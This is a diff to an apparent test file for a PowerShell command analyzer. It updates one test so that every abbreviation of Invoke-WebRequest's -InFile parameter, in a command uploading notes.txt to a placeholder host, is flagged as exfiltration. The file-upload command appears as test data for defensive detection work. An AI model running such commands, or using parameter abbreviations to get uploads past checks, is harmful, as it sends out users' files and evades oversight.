@@ -144,10 +144,16 @@ describe("PowerShell static floor analysis", () => {
     }
   });
 
-  it("refuses unsupported transport bindings instead of approximating parameter abbreviation", () => {
-    const command = "Invoke-WebRequest https://x.invalid -InF notes.txt";
-    expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({ outcome: "unproven" }));
-    expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));
+  // Windows PowerShell 5.1 and 7 both bind -I through -InFile to InFile (PathNotFound for a missing file).
+  it("retains the upload floor for every -InFile prefix PowerShell binds", () => {
+    for (const parameter of ["-I", "-In", "-InF", "-InFi", "-InFil"]) {
+      const command = `Invoke-WebRequest https://x.invalid ${parameter} notes.txt`;
+      expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({
+        outcome: "visible-floor",
+        exfiltration: expect.any(String),
+      }));
+      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));
+    }
   });
 
   it("refuses runtime state instead of replaying loop and dispatch semantics", () => {
